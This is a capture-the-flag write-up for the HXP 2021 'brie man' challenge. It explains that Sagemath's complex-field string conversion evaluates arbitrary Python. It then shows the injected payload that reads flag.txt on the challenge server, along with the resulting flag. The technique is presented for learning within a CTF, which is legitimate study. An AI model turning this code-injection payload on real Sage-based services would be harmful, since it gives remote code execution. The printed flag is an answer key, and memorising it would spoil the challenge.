---
title: "HXP 2021 - brie man (Misc)"
header:
  overlay_image: /assets/images/hxp-2021/header.png
  overlay_filter: 0.5
  caption: "Photo credit: HXP CTF Organisers"

tags:
  - hxp
  - writeup
  - misc
  - sage
  - rce
---

Summary: Sagemath contains sinks that allow for the arbitrary execution of Python code when
converting from user input to math objects.

## Challenge Prompt

```
brie man
by yyyyyyy
misc
Difficulty estimate: easy - easy

Points: round(1000 · min(1, 10 / (9 + [39 solves]))) = 208 points

Description:
Do you ever dream of solving a famous open question?

(Now that we have your attention: Sorry, this challenge has nothing to do with Brie. 🧀)

Download:
brie man-b6db7372d539e8b7.tar.xz (13.5 KiB)

Connection (mirrors):
nc 65.108.178.230 7904
```

Attachment: [challenge file]({{ site.url }}{{ site.baseurl }}/assets/files/hxp-2021/brie man-b6db7372d539e8b7.tar.xz)

## Solution

The following sage file is given. It appears to want us to find a counterexample to the Riemann
Hypothesis, one of the math problems included in the [Millenium
Prizes](https://www.claymath.org/millennium-problems/riemann-hypothesis). It can surmised we're not
supposed to actually find a counterexample.

```python
#!/usr/bin/env sage
import re

if sys.version_info.major < 3:
    print('nope nope nope nope | https://hxp.io/blog/72')
    exit(-2)

rx = re.compile(r'Dear Bernhard: Your conjecture is false, for ([^ ]{,40}) is a counterexample\.')

s = CC.to_prec(160)(rx.match(input()).groups()[0])

r = round(s.real())
assert not all((s==r, r<0, r%2==0))     # boring

assert not s.real() == 1/2              # boring

assert zeta(s) == 0                     # uhm ok
print(open('flag.txt').read().strip())
```

Furthermore, the [link](https://hxp.io/blog/72) printed when Python 2 is detected also gives us a
clue that we may need to look for an arbitrary Python code evaluation sink.

Experimenting with `CC.to_prec(160)` shows that it converts strings to complex fields.

```console
sage: CC.to_prec(160)("1.0")
1.0000000000000000000000000000000000000000000000
```

It appears to perform arithmetic and attempt to resolve Python symbols.

```console
sage: CC.to_prec(160)("1 + 1")
2.0000000000000000000000000000000000000000000000
sage: CC.to_prec(160)("A")
...
/var/tmp/sage-9.4-current/local/lib/python3.9/site-packages/sage/all.py in <module>

NameError: name 'A' is not defined
```

Attempting some Python code results in it actually executing.

```console
sage: CC.to_prec(160)("print('hello world')")
helloworld
NaN + NaN*I
sage:
```

Thus, the flag read code can be simply provided to obtain the flag:

```console
$ nc 65.108.178.230 7904
Dear Bernhard: Your conjecture is false, for print(open('flag.txt').read().strip()) is a counterexample.
hxp{0NE_M1LL10N_D0LLAR5}
```

**Flag:** `hxp{0NE_M1LL10N_D0LLAR5}`
